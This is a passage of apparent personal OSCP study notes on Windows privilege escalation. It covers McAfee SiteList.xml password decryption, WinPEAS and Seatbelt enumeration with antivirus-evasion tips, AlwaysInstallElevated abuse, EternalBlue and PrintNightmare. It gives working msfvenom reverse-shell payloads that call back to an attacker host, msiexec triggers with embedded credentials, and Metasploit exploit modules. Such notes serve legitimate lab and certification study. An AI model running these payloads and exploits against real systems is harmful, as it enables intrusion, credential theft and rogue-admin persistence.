C:\PrivEsc\reverse.exe</em></p><p></p><p><h2>McAfee SiteList.xml</h2></p><p>McAfee stores sensitive information (incl encrypted passwords) in a file named <strong>SiteList.xml</strong>. There may be entries for multiple different users.</p><p></p><p>The encrypted credentials look similar to B64, but must be decrypted using a <a href="https://github.com/funoverip/mcafee-sitelist-pwd-decryption">special tool</a>.</p><p></p><p>This file may / may not be flagged by Winpeas. Even if it&#39;s found, it&#39;s easy to miss, so CTRL+F and search for <strong>SiteList.xml</strong> (manually searching for it is always safer).</p><p></p><p><h3>Example Usage</h3></p><p>Output the file, &amp; manually copy/paste them into the tool, 1 at a time.</p><p></p><p><em>type &quot;C:\ProgramData\McAfee\Common Framework\SiteList.xml&quot;</em><em></em></p><p><em></em><em></em></p><p><em>python3 mcafee_sitelist_pwd_decrypt.py ZDWa2ydWjWkEe6/9rVv52wGJL+Kuan9aZ2OkDTrFXsR/abAFPM9B22djpA06xV7Ef2mwBTzPQdtnY6QNOsVexA==</em></p><p></p><p><h1>Automatic Enumeration</h1></p><p>There are times where one tool catches something missed by another tool (e.g SeatBelt could find Stored Creds missed by Winpeas)</p><p></p><p><h2>SeatBelt</h2></p><p>The OG ver can be found on <a href="https://github.com/GhostPack/Seatbelt">Github</a>, but there&#39;s also a PS cmdlet in <a href="file:///usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/host/">/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/host/</a></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The PS cmdlet may be missing some features (or maybe certain things are broken for both like CredEnum?).</p><p></p><p><h3>PS Cmdlet</h3></p><p>After bypassing execution policy &amp; importing it into your current session, args can be passed by using quotation marks (Unlike the Mimikatz cmdlet, you shouldn&#39;t use single quotes).</p><p></p><p>“Many commands do some type of filtering by default. Supplying the <strong>-full</strong> argument prevents filtering output. Also, the command <strong>-group=all</strong> will run all current checks.”</p><p></p><p><span class="subheading">Run ALL checks &amp; returns ALL output</span>: <em>Invoke-Seatbelt -Command &quot;-group=all -full&quot;</em></p><p></p><p><span class="subheading">Query User Info</span>: <em>Invoke-Seatbelt  -Command &quot;-group=user&quot;</em></p><p></p><p><span class="subheading">Query System Info</span>: <em>Invoke-Seatbelt  -Command &quot;-group=system&quot;</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Above cmd is a firehose of info, &amp; there isn&#39;t any color. May want to be use more precise queries unless you&#39;re desperate, since this won&#39;t be easy to sift through &amp; you&#39;ll likely miss things.</p><p></p><p><h3>Executable</h3></p><p>Wasn&#39;t working on target, whereas the PS cmdlet did work for the most part. Issue with my binary or the target itself?</p><p></p><p><h3>Running Remotely</h3></p><p>Certain queries can be used to enumerate <a href="https://specterops.gitbook.io/ghostpack/seatbelt/command-line-usage/remote-enumeration">remote hosts</a>.</p><p></p><p><h2>Winpeas</h2></p><p>Sometimes misses things like stored creds or creds in a file!</p><p></p><p><h3>AV Bypass</h3></p><p><a href="Defenses_+_Bypasses--AV_Bypass_59.html">AV</a> may <span style="color:#ff0000;">only block certain variants </span>of Winpeas! For example, it may block <strong>winPEASany.exe</strong> but not <strong>winPEAS.bat</strong>.</p><p></p><p>You may also have better luck running the obfuscated version, <strong>winPEASany_ofs.exe</strong>.</p><p></p><p><em>powershell -File .\winPEAS.ps1</em></p><p></p><p><h3>Troubleshooting</h3></p><p><span class="subheading">Color not Working</span></p><p>May work? Reccomended by another Offsec Student.</p><p></p><p>Run the following &amp; then open another terminal.</p><p></p><p><em>REG ADD HKCU\CONSOLE /v VirtualTerminalLevel /t REG_DWORD /d 1</em></p><p></p><p><a name="PowerSploit"></a><h2>PowerSploit</h2><h1></h1></p><p><h1></h1><a href="https://powersploit.readthedocs.io/en/latest/">PowerSploit</a> is a collection of PS Modules to help with Post-Exploitation. You can import the entire thing or a specific PS script located in one of the <a href="file:///usr/share/windows-resources/powersploit/">categories</a>.</p><p></p><p>Each category has its own help page for more information (e.g PrivEsc for <a href="https://powersploit.readthedocs.io/en/latest/Privesc/">PowerUp</a> &amp; Recon for <a href="https://powersploit.readthedocs.io/en/latest/Recon/">PowerView</a>).</p><p><h1></h1></p><p><h1></h1><h3>PowerUp</h3><h1></h1></p><p><h1></h1><a href="file:///usr/share/windows-resources/powersploit/Privesc">/usr/share/windows-resources/powersploit/Privesc</a> PowerUp.ps1 (<a href="PrivEsc--Windows--RCE_33.html#Bypass Exec Policy">Bypass Execution Policy</a>)</p><p></p><p><em>. .\PowerUp.ps1</em><em></em></p><p><em></em><em></em></p><p><em>Invoke-AllChecks | Format-List</em></p><p></p><p><h3>PowerView</h3></p><p>[Win 60-63]</p><p>In addition to normal checks, look for <a href="PrivEsc--Windows_9.html#GPP-Stored Cred">GPP-Stored Creds</a> with <strong>Get-CachedGPPPassword</strong>.</p><p></p><p><h1>Always Install Elevated Functionality</h1></p><p><h2>Background</h2></p><p>Brief description of Attack Vector <a href="https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path">here</a>, but you may need to trigger payload using <strong>runas</strong> as shown in this <a href="https://hacklido.com/blog/443-tryhackme-weasel-walkthrough#1--Privile">example</a>. You can also refer to <a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated">Hacktricks</a>.</p><p></p><p><h2>ID Vulnerability</h2></p><p><span style="color:#ff0000;">If these 2 registers are</span> enabled (value is <strong><span style="color:#ff0000;">0x1</span></strong>), then users of any privilege can<span style="color:#ff0000;"> install (execute) *.msi files as NT AUTHORITY\SYSTEM</span>.</p><p></p><p><h3>Manual Testing</h3></p><p><em>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</em></p><p></p><p><strong>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</strong><strong></strong></p><p><strong>    AlwaysInstallElevated    REG_DWORD    </strong><strong><span style="color:#ff0000;">0x1</span></strong></p><p> </p><p><em>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</em></p><p> </p><p><strong>HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer</strong><strong></strong></p><p><strong>    AlwaysInstallElevated    REG_DWORD    </strong><strong><span style="color:#ff0000;">0x1</span></strong></p><p></p><p><h3>Automated Tools</h3></p><p>The following shows the output for Winpeas, but you can also use tools like PowerUp / SharpUp.</p><p></p><p><strong>=========|| Always Install Elevated Check </strong><strong></strong></p><p><strong>Checking Windows Installer Registry (will populate if the key exists)</strong><strong></strong></p><p><strong>HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer).AlwaysInstallElevated = </strong><strong><span style="color:#ff0000;">1</span></strong><strong></strong></p><p><strong>Try msfvenom msi package to escalate</strong><strong></strong></p><p><strong>...</strong><strong></strong></p><p><strong>HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer).AlwaysInstallElevated =</strong><strong><span style="color:#ff0000;"> 1 </span></strong></p><p></p><p><h2>Payload</h2></p><p><em>msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi</em></p><p></p><p><h2>Triggering Payload</h2></p><p>Sometimes you can&#39;t trigger it by just running the command normally. If the following doesn&#39;t work, try using <strong>runas</strong> or leverage GUI access to double click the binary.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Try this 1st. Sometimes it works when other methods won&#39;t!</p><p></p><p><em>msiexec /i C:\Users\dev-datasci-lowpriv\AlwaysInstallElevated.msi /qn</em></p><p></p><p><h3>Using Powershell Credentials</h3></p><p>Unlike the <strong>runas</strong> method, this works from a non-interactive shell &amp; unlike the <strong>schtasks</strong> or RDP method, no extra permissions are needed.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: When I tested this, the normal triggering method worked (needing without <strong>runas</strong>), so IDK if it&#39;ll always work when the normal method doesn&#39;t work! I think it will though.</p><p></p><p><em>$secpasswd = ConvertTo-SecureString &quot;HackSmarter123&quot; -AsPlainText -Force</em><em></em></p><p><em></em><em></em></p><p><em>$mycreds = New-Object System.Management.Automation.PSCredential (&quot;CyberLens\CyberLens&quot;, $secpasswd)</em><em></em></p><p><em></em><em></em></p><p><em>Start-Process &quot;msiexec.exe&quot; -ArgumentList &quot;/i `&quot;C:\Users\cyberlens\AlwaysInstallElevated.msi`&quot; /qn&quot; -Credential $mycreds</em></p><p></p><p><h3>Using runas</h3></p><p><em>runas /user:dev-datasci-lowpriv &quot;msiexec /i C:\Users\dev-datasci-lowpriv\AlwaysInstallElevated.msi /qn&quot;</em></p><p></p><p><span class="subheading">From Non-Interactive Shell</span>: <strong>runas</strong> will prompt you for a passwd, which you may not be able to do depending on the Reverse Shell you&#39;re using. You may be able to get around this by leveraging <a href="PrivEsc--Windows--RCE_33.html#saving creds">stored credentials</a></p><p></p><p><h3>Using GUI</h3></p><p>If you have RDP or VNC access, you may be able to trigger the payload by just double clicking the malicious file.</p><p></p><p><h3>Using Scheduled Task</h3></p><p>You MAY be able to use <a href="PrivEsc--Windows--RCE_33.html#saving creds">schtasks</a> instead of <strong>runas</strong> if you&#39;re using a non-interactive shell, but you&#39;ll need the <strong>Log on as a batch job</strong> privilege. (I haven&#39;t tested this yet)</p><p></p><p><a name="EternalBlue"></a><h1>EternalBlue</h1></p><p>[OSCP 205-208]</p><p></p><p><span style="color:#ff0000;">Unauthenticated</span> RCE, no credentials are needed. You typically need to be able to connect to the<strong> IPC$ </strong>share, but you <span style="color:#ff0000;">don&#39;t need Read or Write permissions</span>.</p><p></p><p><h2>Detection</h2></p><p>Should be detectable via nmap. Can also manually cross-reference OS/<a href="https://en.wikipedia.org/wiki/Windows_10_version_history">Build</a> to check for vuln SW.</p><p></p><p>It <span style="color:#ff0000;">only affects SMBv1</span>, so even if the Host SW is vuln, the machine can&#39;t be exploited if SMBv1 is disabled &amp; it only supports later SMB versions (i.e SMBv2).</p><p></p><p><em>sudo nmap -sV -p445 --script &quot;vuln&quot; -v IP</em></p><p></p><p><h3>Metasploit</h3></p><p>Nmap should work fine, so avoid using MsF for OSCP.</p><p></p><p><em>use scanner/smb/smb_ms17_010</em></p><p></p><p><h2>Exploitation</h2></p><p>Many PoCs vary based on target OS.</p><p></p><p>Use the corresponding <a href="file:///home/user/git/windows-kernel-exploits/MS17-010/MS17-010-2012/">exploit</a> in this directory (usage covered in aforementioned pages).</p><p></p><p><h3>Metasploit</h3></p><p>Preferred method is the aforementioned Repo for the OSCP.</p><p></p><p>There are various Eternal Blue modules. The following seems to be more reliable &amp; less likely to crash target.</p><p></p><p><em>use exploit/windows/smb/ms17_010_psexec</em></p><p></p><p><a name="PrintNightmare"></a><h1>PrintNightmare</h1></p><p>[Win 48-49, 52]</p><p></p><p>You can see the <a href="https://tryhackme.com/r/room/printnightmarehpzqlp8">TryHackMe room</a> for more information.</p><p></p><p><h2>Background</h2></p><p><a href="https://en.wikipedia.org/wiki/PrintNightmare">PrintNightmare</a> is a vulnerability in the print spooler service, &amp; can be used to refer to any of the following 3 vulnerabilities: <strong>CVE-2021-1675</strong> (PrivEsc), <strong>CVE-2021-34527</strong> (RCE), &amp; <strong>CVE-2021-34481</strong> (RCE).</p><p></p><p>The earliest CVE was used for PrivEsc &amp; required local access, &amp; <strong>CVE-2021-34527</strong> allows for remote injection of the DLL for RCE.</p><p></p><p>You can use either of the following 2 vulnerable protocols for PrintNightmare exploitation: <strong>MS-PAR</strong> &amp; <strong>MS-RPRN</strong>. There are less requirements for exploiting <strong>MS-PAR</strong>, so it&#39;s the best option if it&#39;s available.</p><p></p><p><h2>Requirements</h2></p><p><h3>MS-PAR</h3></p><p>Each of the following 3 conditions must be met.</p><p><ol><li>The print spooler service is running on the target &amp; allows for remote connections. It&#39;s enabled by default.</li></ol></p><p><ol><li>Credentials for any user in the Domain (Does this include the Guest account?)</li></ol></p><p><ol><li>A network share that can be accessed via the target server. It&#39;ll be used to store the malicious DLL (e.g. Attacker runs <a href="Recon_+_Services--SMB_11.html#run smb server">impacket-smbserver</a> to host the payload).</li></ol></p><p></p><p><h3>MS-RPRN</h3></p><p>In addition to the 3 conditions required for <strong>MS-PAR</strong> exploitation, you <span style="color:#ff0000;">also need any 1 of the following conditions</span> to be met.</p><p></p><p><span class="subheading">Group Membership</span>: On the DC, the compromised account you&#39;re using must be a member of the <strong>Pre-Windows 2000 Compatible Access</strong> pre-built group.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: By defaullt, this group contains all members of <strong>Authenticated Users</strong>, which is everyone other than the Guest &amp; Anonymous accounts. Therefore, this is usually the easiest requirement to fulfill.</p><p></p><p><span class="subheading">Disabled Warnings</span>: The <strong>Point and Print</strong> <span style="color:#ff0000;">warnings on install &amp; update</span> are be disabled, so as not to require elevation on print driver installation. They&#39;re enabled by default, so this is isn&#39;t the normal configuration for Windows.</p><p></p><p><span class="subheading">Disabled UAC</span>: UAC is turned off (not the default config), &amp; isn&#39;t enforcing <strong>Admin Approval Mode</strong> (apparently it&#39;s <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/user-account-control-admin-approval-mode-for-the-built-in-administrator-account#reference">not enforced</a> by default).</p><p></p><p><h2>Exploitation</h2></p><p><h3>ID Vulnerable Protocols</h3></p><p>The easiest way to determine whether <strong>MS-PAR</strong> or <strong>MS-RPRN</strong> are in enabled, is to use MS-RPC.</p><p></p><p><em>impacket-rpcdump IP | grep -E &quot;MS-PAR|MS-RPRN&quot;</em></p><p></p><p><em>rpcdump.py @192.168.1.10 | egrep &#39;MS-RPRN|MS-PAR&#39;</em></p><p></p><p><h3>Exploit Script</h3></p><p>The MsF module seems to be buggy. I&#39;ve had better luck with this Github <a href="https://github.com/cube0x0/CVE-2021-1675">Repo</a>. Since that PoC requires a custom version of Impacket, I reccomend setting it up inside a <a href="Appendix--Code--Python_77.html#python venv">Python Venv</a>.</p><p></p><p>In the Venv, <strong>smbserver.py --version</strong> should show <strong>Impacket v0.9.24.dev1+20210704.162046.29ad5792</strong>.</p><p></p><p><h3>Payload</h3></p><p>Create or find a malicious DLL to use. You can use <strong>msfvenom</strong> to create the DLL, but IRL it&#39;d likely be detected by AV (unless it&#39;s sufficiently <a href="Metasploit_7.html#AV Bypass">obfuscated</a>).</p><p></p><p>If you&#39;re using <strong>msfvenom</strong>, you can optionally make it a meterpreter payload &amp; catch it with <strong>msfconsole</strong> handler. However, the following is just a standard payload for listeners like netcat. (may want to specify IP, not interface)</p><p></p><p>msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9999 -f dll -o /path/to/shell.dll</p><p></p><p><h3>SMB Server</h3></p><p>After setting up your SMB Server, you should manually connect to it anonymously &amp; verify that the payload is accessible.</p><p></p><p></p><p><span class="subheading">Using Samba</span>: Edit configuration file to allow for Anonymous access with <strong>sudo vim /etc/samba/smb.conf</strong> &amp; append the text referenced in the <a href="https://github.com/cube0x0/CVE-2021-1675?tab=readme-ov-file#smb-configuration">Repo&#39;s README</a>. Restart SVC to apply the changes &amp; verify it&#39;s running.</p><p></p><p><em>sudo service smbd restart</em><em></em></p><p><em></em><em></em></p><p><em>systemctl status smbd</em></p><p></p><p><h1>Tips</h1><ul><li>Always name the outfile when using IWR for file transfer</li></ul></p><p><ul><li><span style="color:#ff0000;">Check root FS</span> for abnormal directories dir \. They&#39;re likely there for a reason (albeit could be rabbit hole).</li></ul></p><p>	<span style="color:#ff0000;">Don&#39;t rely on filtered searches</span>, <span style="color:#ff0000;">manually review contents</span> (i.e missed SAM &amp; SYSTEM hives bc I was filtering by file extensions).</p><p><ul><li>Crashed 1 user&#39;s RDP session &amp; couldn&#39;t reconnect as them, so I created another Local Admin acct (via SYSTEM CLi) &amp; used that to RDP. Can open taskmgr as them &amp; sort Procs by Users to kill the problematic Proc</li></ul></p><p><ul><li><span style="color:#ff0000;">SYSTEM Post Exploit</span> [CTF B 56-57]. Non-exhaustive list.</li></ul></p><p><ul><li><em>whoami /all</em> won&#39;t show nested groups, but still has a lot of useful info</li></ul></p><p><ul><li>Sometimes need to use AD pivoting methods &amp; return to target host for <a href="PrivEsc_8.html">PrivEsc</a> (e.g Kerberoast).</li></ul></p><p><ul><li>Even if you get RCE as an Acct, you may not have their passwd. You may be able to leverage RCE (or a <a href="Recon_+_Services--WebApp_12.html">WebApp</a> running under that Acct) to obtain their hash (i.e trigger SMB connection to <a href="Misc_Attacks--Network_Attacks_14.html#capture ntlm">capture their NTLMv2 hash</a>)</li></ul></p><p><ul><li><span style="color:#ff0000;">Most users can write to </span><strong><span style="color:#ff0000;">\users\public\ </span></strong>but <span style="color:#ff0000;">NOT ALL</span></li></ul></p><p></p></div>
</body>
</html>
